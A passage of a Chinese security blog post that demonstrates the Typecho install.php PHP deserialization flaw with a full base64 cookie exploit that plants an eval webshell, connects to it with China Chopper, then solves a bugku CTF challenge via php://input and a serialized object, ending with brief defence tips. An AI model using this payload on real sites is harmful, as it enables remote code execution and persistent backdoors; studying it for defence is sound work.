class="line"><span class="comment">// 挡掉可能的跨站请求</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_GET</span>) || !<span class="keyword">empty</span>(<span class="variable">$_POST</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$parts</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$parts</span>[<span class="string">&#x27;port&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$parts</span>[<span class="string">&#x27;host&#x27;</span>] = <span class="string">&quot;<span class="subst">&#123;$parts[&#x27;host&#x27;]&#125;</span>:<span class="subst">&#123;$parts[&#x27;port&#x27;]&#125;</span>&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$parts</span>[<span class="string">&#x27;host&#x27;</span>]) || <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>] != <span class="variable">$parts</span>[<span class="string">&#x27;host&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上述代码经过了两次的判断，我们继续跟进，在install.php 232行~237行：</p>
+<p><img src="https://secure2.wostatic.cn/static/EWA6GEMUPgWhcD8Vsjkf2/image.png"></p>
+<p>出现一个比较明显的反序列化漏洞，首先获取到cookie中的__typecho_config值base64解码后，然后进行反序列化。 想要执行，只需isset($_GET[‘finish’])并且__typecho_config存在值。反序列化后把config[‘adapter’]和config[‘prefix’]传入Typecho_Db进行实例化。然后调用Typecho_Db的addServer方法，调用Typecho_Config实例化工厂函数对Typecho_Config类进行实例化。</p>
+<p>Feed.php中__get()方法—-&gt;Request.php中的applyFilter函数—–&gt;call_user_func(代码执行)</p>
+<p>复现漏洞</p>
+<p>访问URL：<a target="_blank" rel="noopener" href="http://192.168.186.140/build/install.php?finish=1">http://192.168.186.140/build/install.php?finish=1</a></p>
+<p>使用BP进行抓包，如图：</p>
+<p><img src="https://secure2.wostatic.cn/static/wh4c2wKwsrnRnC42jFtk3p/image.png"></p>
+<p>抓到包之后我们在BurpSuite点击右键，发送到Repeater，并将POC文件中的Cookie和Referer复制到BurpSuite中修改Referer的IP为192.168.186.140，如图所示。</p>
+<p><img src="https://secure2.wostatic.cn/static/rDEJuAp7avAndaKSFCmgqE/image.png"></p>
+<p>点击“GO”，可以看到</p>
+<p><img src="https://secure2.wostatic.cn/static/8JPDEGMQLoKwYgKgbZYvvm/image.png"></p>
+<p>POC</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Cookie: __typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NDp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMjoiAFR5cGVjaG9fRmVlZABfY2hhcnNldCI7czo1OiJVVEYtOCI7czoxOToiAFR5cGVjaG9fRmVlZABfbGFuZyI7czoyOiJ6aCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTc6ImZpbGVfcHV0X2NvbnRlbnRzKCdwMC5waHAnLCAnPD9waHAgQGV2YWwoJF9QT1NUW3AwXSk7Pz4nKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NzoidHlwZWNobyI7fQ==</span><br><span class="line">Referer:http:<span class="comment">//IP/install.php </span></span><br></pre></td></tr></table></figure>
+
+<p>也即：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">2</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;adapter&quot;</span>;O:<span class="number">12</span>:<span class="string">&quot;Typecho_Feed&quot;</span>:<span class="number">4</span>:&#123;s:<span class="number">19</span>:<span class="string">&quot;Typecho_Feed_type&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;ATOM 1.0&quot;</span>;s:<span class="number">22</span>:<span class="string">&quot;Typecho_Feed_charset&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;UTF-8&quot;</span>;s:<span class="number">19</span>:<span class="string">&quot;Typecho_Feed_lang&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;zh&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;Typecho_Feed_items&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;a:<span class="number">1</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;author&quot;</span>;O:<span class="number">15</span>:<span class="string">&quot;Typecho_Request&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">24</span>:<span class="string">&quot;Typecho_Request_params&quot;</span>;a:<span class="number">1</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;screenName&quot;</span>;s:<span class="number">57</span>:<span class="string">&quot;file_put_contents(’404.php&#x27;, &#x27;&lt;?php @eval(<span class="subst">$_POST</span>[i]);?&gt;&#x27;)&quot;</span>;&#125;s:<span class="number">24</span>:<span class="string">&quot;Typecho_Request_filter&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">6</span>:<span class="string">&quot;assert&quot;</span>;&#125;&#125;&#125;&#125;&#125;s:<span class="number">6</span>:<span class="string">&quot;prefix&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;typecho&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如图返回状态码为500的数据包就代表成功了。我们这时使用中国菜刀连接</p>
+<p><img src="https://secure2.wostatic.cn/static/4b6W541C3Zckjb8vbxo6Me/image.png"></p>
+<p><img src="https://secure2.wostatic.cn/static/9YX12yvnATB9HVP63gHtik/image.png"></p>
+<h1 id="bugku-文件包含和PHP反序列化漏洞CTF练习题"><a href="#bugku-文件包含和PHP反序列化漏洞CTF练习题" class="headerlink" title="bugku 文件包含和PHP反序列化漏洞CTF练习题"></a>bugku 文件包含和PHP反序列化漏洞CTF练习题</h1><p>访问URL：<a target="_blank" rel="noopener" href="http://192.168.2.101/%EF%BC%8C%E6%8F%90%E7%A4%BA">http://192.168.2.101/，提示</a> you are not the number of bugku ! 查看页面源代码发现有当前页面的代码</p>
+<p><img src="https://secure2.wostatic.cn/static/mDZUyuHWcgEjYTSG5qvren/image.png"></p>
+<p>txt参数可以使用php://input绕过，效果如下</p>
+<p><img src="https://secure2.wostatic.cn/static/8eUKrujeJwp6MQ51ih8zr7/image.png"></p>
+<p>然后需要包含file参数，但是需要包含文件需要做信息收集，index.php、hint.php、flag.php，三个页面。直接包含flag.php会提示“不能现在就给你flag哦”。所以可以试一试包含hint.php，里面的源码可以通过php://filter/convert.base64-encode/resource=hint.php查看。</p>
+<p><img src="https://secure2.wostatic.cn/static/96t8twGFqnMQmj86SnjQA1/image.png"></p>
+<p>解密如下：</p>
+<p><img src="https://secure2.wostatic.cn/static/cq823TVz6w64A5udLomXJb/image.png"></p>
+<p>查看hint.php以及index.php的代码我们可以知道，接下来需要使用反序列化去读取flag.php中数据。接下来需要构造password的值。</p>
+<p>payload如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable language_">$this</span>-&gt;file); </span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> (<span class="string">&quot;good&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$f</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="variable">$f</span>-&gt;file=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$f</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>运行结果为：O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p>
+<p><img src="https://secure2.wostatic.cn/static/t4KGnT4abwoH9w37VEEPkm/image.png"></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.2.101/index.php?txt=php://input&file=hint.php&password=O:4:%22Flag%22:1:%7Bs:4:%22file%22;s:8:%22flag.php%22;%7D">http://192.168.2.101/index.php?txt=php://input&amp;file=hint.php&amp;password=O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</a></p>
+<p><img src="https://secure2.wostatic.cn/static/tU34Q5YCqSv6jBqV5dGFVF/image.png"></p>
+<p>在源代码中可以看到flag{php_is_the_best_language}</p>
+<h1 id="PHP反序列化漏洞的防御"><a href="#PHP反序列化漏洞的防御" class="headerlink" title="PHP反序列化漏洞的防御"></a>PHP反序列化漏洞的防御</h1><p>1.要严格控制unserialize函数的参数，坚持用户所输入的信息都是不可靠的原则</p>
+<p>2.要对于unserialize后的变量内容进行检查，以确定内容没有被污染</p>
+
+      </div>
+    </div>
+</div>
+
+
+<div class="post-footer">
+  
+  <div class="donate text-center">
+    <span></span>
+    <div class="donate-way">
+      
+    </div>
+  </div>
+  
+
+</div>
+
+    <!-- Comments -->
+    <div class="comments">
+        
+        
+    </div>
+
+</article>
+
+
+        </div>
+        
+<footer class="text-center">
+    
+    
+    
+    
+    
+    <p>&copy;  2020 - 2021&nbsp;&nbsp;Theme Miracle</p>
+    
+    <p>Powered by <a href="https://hexo.io" target="_blank">Hexo</a> | Theme by <a href="https://github.com/hifun-team/hexo-theme-miracle" target="_blank">Miracle</a></p>
+    
+    
+</footer>
+
+<div class="p-btn">
+    
+        <a class="toc-btn" id="toc-btn"><i id="i-menu"></i></a>
+    
+    <a href="#top" class="click-btn">
+      <i id="i-up"></i>
+    </a>
+</div>
+
+<!-- SCRIPTS -->
+
+
+
+
+
+
+
+<script>
+    document.getElementById("btn-dropdown").addEventListener('click', () => {
+      toggleClass("#dropdown-menus","display-inline");
+    });
+    console.log('\n' + ' %c Powered by Hexo Theme Miracle ' + ' %c https://github.com/hifun-team/hexo-theme-miracle ' + '\n' + '\n', 'color: #fff; background: #4F9BFA; padding:5px 0;', 'background: #FFF; padding:5px 0;');
+
+    
+
+    
+  /* 小彩蛋: 饮茶先啦 */
+  setTimeout(() => {
+    var time = new Date();
+    if (time.getHours() == 15) {
+      let comment = document.createComment(' 三点几嚟！饮茶先啦！ ');
+      document.body.insertBefore(comment, document.getElementsByTagName('header')[0]);
+    }
+  },1);
+    
+</script>
+
+
+<script>
+    var postImg = document.querySelectorAll("article[class=page] img");
+    for (let imgi = 0; imgi < postImg.length; imgi++) {
+        postImg[imgi].onclick = () => {
+            let zoomImg = document.createElement("div");
+            zoomImg.id = "zoomImg";
+            zoomImg.innerHTML = `<div id="zoom-picture"></div>
+    <div class="poptrox-overlay"
+        style="position: fixed; left: 0px; top: 0px; z-index: 20000; width: 100%; height: 100%; text-align: center; cursor: zoom-out; opacity: 1;">
+        <div style="display:inline-block;height:100%;vertical-align:middle;"></div>
+        <div
+            style="position:absolute;left:0;top:0;width:100%;height:100%;background:#000000;opacity:0;filter:alpha(opacity=0);">
+        </div>
+        <div class="poptrox-popup"
+            style="display: inline-block; vertical-align: middle; position: relative; z-index: 1; cursor: zoom-out; min-width: 10px; min-height: 10px; width: auto; height: auto;">
+            <div class="loader" style="display: none;"></div>
+            <div class="pic" style="text-indent: 0px;"><img
+                    src="${ postImg[imgi].srcset || postImg[imgi].src }" alt="Loading..."
+                    style="vertical-align: bottom; max-width: 85vw; max-height: 85vh;"></div>
+        </div>
+    </div>`;
+            document.body.appendChild(zoomImg);
+                document.querySelector("#zoomImg").onclick = () => {
+                    document.querySelector("#zoomImg").remove();
+                }
+        }
+    }
+    
+</script>
+
+
+
+
+    <script>
+        query("#toc-btn")[0].onclick = () => {
+            if (query(".post-toc")[0].innerHTML) {
+                toggleClass(".post-toc", "display-inline");
+            }
+        }
+
+        if (!query(".post-toc")[0].innerHTML) {
+            addClass("#toc-btn","display-none");
+        }
+    </script>
+
+
+
+
+
+
+
+
+
+        </div>
+        <div id="css-loading">
+            <h3 class="text-center">加载中...</h3>
+        </div>
+        
+    </body>
+</html>
